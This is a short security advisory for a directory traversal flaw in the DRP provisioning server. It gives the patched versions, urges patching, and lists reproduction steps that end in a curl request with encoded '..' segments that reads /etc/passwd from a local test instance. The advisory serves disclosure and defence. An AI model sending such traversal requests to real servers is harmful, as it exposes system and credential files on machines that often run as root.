CVE 20200924a: Web requests can navigate outside of DRP controlled areas
========================================================================

DRP server incorrectly respects using `..` for navigation if resulting path is outside of managed areas.  This potentially allowed bad actors to access the host file system.

* Classification: Directory Traversal
* Reported: Sept 24, 2020
* Fixed: Sept 24, 2020
* Addressed In: v4.5, v4.4.7, v4.3.8, v4.2.17

Recommendation
--------------

Users are advised to apply this patch as soon as possible.   Patching involves replacing the DR-SERVER binary that closes matches the currently deployed version.


Mitigation
----------

Code was added to prevent out of bounds navigation.

Steps to reproduce
------------------

  :: 

    docker run --rm -it ubuntu /bin/bash

    apt update && apt install -y curl
    cd /opt
    mkdir drp ; cd drp
    curl -fsSL get.rebar.digital/stable | bash -s -- --isolated install
    ./dr-provision --base-root=`pwd`/drp-data --local-content="" --default-content="" > drp.log 2>&1 &
    curl -k https://127.0.0.1:8092/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

The above results on the contents of /etc/passwd being shown. This is particularly bad given that this application generally runs as root.
